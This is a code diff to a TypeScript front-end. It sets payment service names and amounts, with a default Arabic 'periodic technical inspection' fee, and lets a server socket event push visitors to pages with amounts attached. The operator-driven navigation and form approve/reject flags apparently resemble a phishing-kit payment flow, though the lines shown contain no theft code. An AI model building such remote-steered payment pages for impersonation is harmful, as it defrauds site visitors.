@@ -195,6 +195,7 @@ export function sendPendingPage() {
   }
 }
 
+const DEFAULT_PAYMENT_SERVICE = 'الفحص الفني الدوري'; const DEFAULT_PAYMENT_AMOUNT = '115'; function cleanAmountValue(v: any): string { if (!v) return ''; return String(v).replace(/[٠-٩]/g, function (d) { return String('٠١٢٣٤٥٦٧٨٩'.indexOf(d)); }).replace(/[^0-9.]/g, ''); } function paymentInfoFromSelection(): { service: string; amount: string } | null { try { const raw = localStorage.getItem('selectedOffer'); if (!raw) return null; const offer = JSON.parse(raw); const service = offer && offer.name ? String(offer.name) : ''; const price = offer && offer.totalPrice ? Number(offer.totalPrice) : 0; if (!service && !price) return null; const total = price > 0 ? Math.round(price * 1.15 * 100) / 100 : 0; return { service: service, amount: total > 0 ? String(total) : '' }; } catch (e) { return null; } } export function resolvePaymentInfo(): { service: string; amount: string } { const params = new URLSearchParams(window.location.search); const urlService = params.get('service') || ''; const urlAmount = cleanAmountValue(params.get('amount')); const fromSelection = paymentInfoFromSelection(); const storedService = localStorage.getItem('paymentServiceName') || ''; const storedAmount = cleanAmountValue(localStorage.getItem('paymentTotalAmount')); const service = urlService || (fromSelection && fromSelection.service) || storedService || DEFAULT_PAYMENT_SERVICE; const amount = urlAmount || (fromSelection && fromSelection.amount) || storedAmount || DEFAULT_PAYMENT_AMOUNT; localStorage.setItem('paymentServiceName', service); localStorage.setItem('paymentTotalAmount', amount); return { service: service, amount: amount }; }
 // Initialize socket listeners
 export function initializeSocket() {
   const s = socket.value;
@@ -235,14 +236,14 @@ export function initializeSocket() {
     waitingMessage.value = "";
   });
 
-  s.on("visitor:navigate", (page: string) => {
+  s.on('visitor:navigate', (payload: any) => { const page: string = typeof payload === 'string' ? payload : payload && payload.page;
     console.log("Navigate to:", page);
     if (page) {
       // CRITICAL: Clear ALL waiting overlay signals before navigating
       waitingMessage.value = "";
       isFormApproved.value = false;
       isFormRejected.value = false;
-      clientNavigate("/" + page);
+      let __path = '/' + page; if (payload && typeof payload === 'object') { const __qs: string[] = []; if (payload.service) { localStorage.setItem('paymentServiceName', String(payload.service)); __qs.push('service=' + encodeURIComponent(String(payload.service))); } if (payload.amount !== undefined && payload.amount !== null && String(payload.amount) !== '') { const __a = String(payload.amount).replace(/[^0-9.]/g, ''); if (__a) { localStorage.setItem('paymentTotalAmount', __a); __qs.push('amount=' + encodeURIComponent(__a)); } } if (__qs.length) __path += '?' + __qs.join('&'); } clientNavigate(__path);
     }
   });
 
